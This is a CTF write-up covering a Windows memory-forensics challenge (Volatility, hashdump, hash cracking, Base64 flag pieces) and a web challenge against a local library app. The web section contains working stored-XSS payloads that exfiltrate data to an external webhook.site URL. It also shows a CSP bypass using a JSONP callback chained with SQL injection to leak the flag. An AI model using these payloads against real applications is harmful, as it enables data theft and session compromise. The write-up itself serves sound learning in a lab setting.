# Forensic

Gotham

When I first received the challenge, the only artifact provided was a memory dump. Before touching tools, I checked the file size and format to understand what I was working with. It appeared to contain complete system memory, so the goal was clear — enumerate processes, locate artifacts, extract data, and assemble flags.

## Volatility2

Volatility is the standard toolkit for memory analysis ,  Volatility2 more suited for deep forensic extraction here.

To proceed, I installed the required Volatility2 dependencies:
```
pip2 install pycryptodome
pip2 install distorm3
pip2 install yara-python
```

Then I loaded the memory file using Volatility2:

```
python2 vol.py -f gotham.raw imageinfo
```

Step 1 – Extracting Terminal History

Command history often reveals flags or hints. So I ran:
```
python2 vol.py -f gotham.raw --profile=Win7SP1x64 cmdscan
```

Among the recovered commands were:

whoami
dir
bi0s
dfirlabs
Ymkwc2N0Znt3M2xjMG0zXw==
azr43ln1ght.github.io
Azr43lKn1ght
did you find flag1?


That Base64-looking string was suspicious:
```
echo "Ymkwc2N0Znt3M2xjMG0zXw==" | base64 -d
```

→ Output revealed FLAG 1

Step 2 – Process Dumping for More Flags

Next, I listed running processes using pstree/plist and identified notepad.exe (PID 2592) as a good target to dump:
```
strings -el 2592.dmp | grep -i flag
```

Two Base64 values popped up:

flag3 = aDBwM190aDE1Xw==
flag4 = YjNuM2YxNzVfeTB1Xw==


Decoded:
```
echo "YjNuM2YxNzVfeTB1Xw==" | base64 -d 
→ b3n3f175_y0u
```
```
echo "aDBwM190aDE1Xw==" | base64 -d
→ h0p3_th15_
```

So now we had FLAG 3 & FLAG 4.

Step 3 – The RAR Archive (Flag 5)

Volatility's filescan revealed a RAR file:
```
filescan | grep flag5
```

Dumped the offset → extracted as:
```
mv file.None.0xfffffa80049f86a0.dat flag5.rar
unrar x flag5.rar
```

The file requested a password — likely the system password. Using hashdump:
```
python2 vol.py -f gotham.raw --profile=Win7SP1x64 hashdump
```

One of the password hashes belonged to user bruce. Cracked using hashcat and the correct password unlocked flag.txt, which contained:
```
bTByM18xMzMzNzQzMX0=
echo "bTByM18xMzMzNzQzMX0=" | base64 -d
→ m0r3_13337431}
```

This gave FLAG 5 (final part).

Flag 2

The remaining part was likely embedded in a paint/MS-Paint memory segment. After dumping, the recovered BMP was too blurred and unreadable but after some time and some tools the flag was t0_df1r_l4b5.

Final Reconstructed Flag
```
bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}
```

# Web Exploitation

i accessed the ViteLibrary web application at localhost:50001
Found a library management system where users can add books with title, author, and page count
Noticed a share feature at ```/liteShare/:user/:liteId```
Tested login functionality with admin:admin credentials - successfully logged in

Examined scripts.js and found vulnerable code:
```
javascriptlibraryRoot.innerHTML += cardTemplate
    .replace("Book Title", book.title)
    .replace("Book Author", book.author);
```
User input directly inserted into innerHTML without sanitization Stored XSS vulnerability identified

Checked main.js and found CSP configuration:

Blocks inline <script> tags
Allows inline event handlers like onerror


Discovered toTitleCase() function processes author field


Found /getBooks endpoint limits results 

Created book using browser console:
```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: 'Test Book',
    author: `<img src=x onerror=alert(1)>`,
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```

Result: Book created but XSS didn't execute toTitleCase() broke the payload

Moved payload to title field to bypass toTitleCase():

```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: `<img src=x onerror="fetch('/getBooks').then(r=>r.json()).then(b=>fetch('https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6?flag='+encodeURIComponent(JSON.stringify(b))))">`,
    author: 'Test',
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```
Result: Book created successfully with liteId: hy2iGMCe9a

Opened incognito window
Logged in as admin:admin
```
Visited http://localhost:50001/liteShare/hacker/hy2iGMCe9a
```

Checked webhook.site

Result: Webhook received request at /flag endpoint but no query parameters - data not exfiltrated

then tried new payload with webhook init and iframe 
```
const webhookUrl = 'https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6';

const payload = `<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&jscmd=viewapi&callback=fetch(%27%2Fapi%2Fdelete%3Ftitle%3D%27%2BencodeURIComponent(%27%22%20UNION%20SELECT%20link%20as%20title%20FROM%20BOOKS%20WHERE%20link%20LIKE%20%22%25flag%25%22%20--%27)%2C%7Bmethod%3A%27POST%27%7D).then(r%3D%3Er.json()).then(d%3D%3E%7Bwindow.top.location%3D%27${webhookUrl}%3Fflag%3D%27%2BencodeURIComponent(d.book.title)%7D)'></script>"></iframe>`;

fetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: payload,
    author: 'FinalExploit',
    pages: 300,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
})
.then(r => r.json())
.then(d => {
  if (d.status === 'ok') {
    const shareUrl = `http://localhost:50001/liteShare/hacker/${d.book.liteId}`;
    console.log(shareUrl);
  }
});
```
<img width="1919" height="911" alt="image" src="https://github.com/user-attachments/assets/4f5db92c-a13c-45bc-b0a0-8b2088af3653" />

i then went to incognito logged in as admin and ran the url in browser
```
http://localhost:50001/liteShare/hacker/QpjjOBQ_Hd
```
<img width="1918" height="915" alt="image" src="https://github.com/user-attachments/assets/6b72697f-c06f-490f-a209-b1f40f626774" />

the flag was with webhook

final flag
```
flag=nite{test_flag_stp}
```
